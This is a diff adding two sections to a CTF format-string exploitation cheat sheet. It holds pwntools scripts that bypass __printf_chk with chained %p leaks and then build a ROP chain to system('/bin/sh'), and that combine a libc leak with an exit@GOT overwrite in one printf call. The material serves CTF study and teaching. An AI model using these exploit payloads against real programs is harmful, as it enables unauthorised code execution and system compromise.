@@ -12,6 +12,8 @@
 - [Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)](#format-string-saved-ebp-overwrite-for-bss-pivot-plaidctf-2015)
 - [argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)](#argv0-overwrite-for-stack-smash-info-leak-hitcon-ctf-2015)
 - [Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)](#format-string-fini_array-loop-for-multi-stage-exploitation-codegate-2016)
+- [__printf_chk Bypass with Sequential %p (VolgaCTF 2017)](#__printf_chk-bypass-with-sequential-p-volgactf-2017)
+- [Leak + GOT Overwrite in Single printf Call (picoCTF 2017)](#leak--got-overwrite-in-single-printf-call-picoctf-2017)
 
 ---
 
@@ -358,3 +360,93 @@ payload = fmtstr_payload(offset, {printf_got: system, stack_chk_got: main_addr})
 **Key insight:** `.fini_array` entries are called when `main()` returns. Overwriting with `main()` creates an execution loop for multi-stage format string attacks. Deliberately corrupting the canary triggers `__stack_chk_fail` as a controlled re-entry vector when that GOT entry has been redirected.
 
 **References:** Codegate 2016
+
+---
+
+## __printf_chk Bypass with Sequential %p (VolgaCTF 2017)
+
+**Pattern:** `__printf_chk()` blocks `%n` writes and direct parameter access (`%123$p`). Bypass by chaining sequential `%p` specifiers to reach the desired stack offset.
+
+```python
+from pwn import *
+
+# __printf_chk restrictions:
+# - No %n/%hn/%hhn writes
+# - No direct access: %123$p fails
+# - Sequential access still works: %p%p%p...
+
+# Leak canary at stack offset 267:
+payload = "%p." * 267 + "%p"  # sequential %p to offset 267
+io.sendline(payload.encode())
+response = io.recvline().decode()
+leaks = response.split(".")
+canary = int(leaks[266], 16)  # 267th value (0-indexed)
+
+# Leak libc return address at offset 269:
+payload = "%p." * 269 + "%p"
+io.sendline(payload.encode())
+response = io.recvline().decode()
+leaks = response.split(".")
+libc_ret = int(leaks[268], 16)
+libc_base = libc_ret - known_offset
+
+# Then use stack overflow for ROP since format string write is blocked
+payload = b"A" * buf_size
+payload += p64(canary)
+payload += p64(0)           # saved rbp
+payload += p64(pop_rdi)
+payload += p64(binsh_addr)
+payload += p64(system_addr)
+io.sendline(payload)
+```
+
+**Key insight:** While `__printf_chk` prevents `%n` and direct parameter access (`%N$`), it still allows sequential format specifiers. Chaining hundreds of `%p` reaches any stack offset, enabling leaks (canary, libc, PIE) even without write capability. Combine with a separate overflow vulnerability for the write stage.
+
+**When to recognize:** Binary uses `__printf_chk` or `__fprintf_chk` (visible in disassembly or via `__fortify_source`). Direct `%N$p` fails but sequential `%p%p%p...` still works. Output may be very large -- parse carefully with delimiters.
+
+**References:** VolgaCTF 2017
+
+---
+
+## Leak + GOT Overwrite in Single printf Call (picoCTF 2017)
+
+**Pattern:** When a format string vulnerability is followed immediately by `exit(0)`, combine address leak and GOT overwrite in a single printf invocation.
+
+```python
+from pwn import *
+
+# Must leak libc AND redirect exit() in one printf call
+# Layout: padding + dummy_addr + %leak$p + %Nc + %write$hn + padding + got_addr
+
+exit_got = elf.got['exit']
+main_addr = elf.sym['main']
+target_low16 = main_addr & 0xFFFF
+
+payload = b'e_______'                     # 8 bytes padding
+payload += p64(0x4141414141)              # dummy (consumed by leak specifier)
+payload += b' %25$p'                      # leak libc address at offset 25
+# Calculate bytes needed: target_low16 - bytes_written_so_far
+bytes_written = len(payload)
+padding_needed = (target_low16 - bytes_written) % 0x10000
+payload += f'%{padding_needed}c%19$hn'.encode()  # write low 2 bytes to offset 19
+payload += b'A' * ((8 - (len(payload) % 8)) % 8) # alignment to 8 bytes
+payload += p64(exit_got)                  # address for %19$hn write
+
+# Result: leaks libc via %25$p AND overwrites exit@GOT via %19$hn
+# exit() jumps back to main for second-stage exploitation
+io.sendline(payload)
+
+# Parse leaked libc address from output
+io.recvuntil(b' 0x')
+libc_leak = int(io.recv(12), 16)
+libc_base = libc_leak - known_offset
+
+# Second pass: now with libc known, overwrite for shell
+# ...
+```
+
+**Key insight:** A single `printf` can perform both reads (`%p`) and writes (`%hn`) simultaneously. When `exit()` immediately follows the vulnerability, overwrite `exit@GOT` with `main`'s address in the same call that leaks libc, creating a re-entry point for full exploitation. The key is careful offset calculation so the leak specifier and write specifier reference the correct stack positions.
+
+**When to recognize:** Format string vulnerability with only one shot before `exit()` or another terminating function. The single-call technique avoids needing a loop or re-entry mechanism before establishing one.
+
+**References:** picoCTF 2017
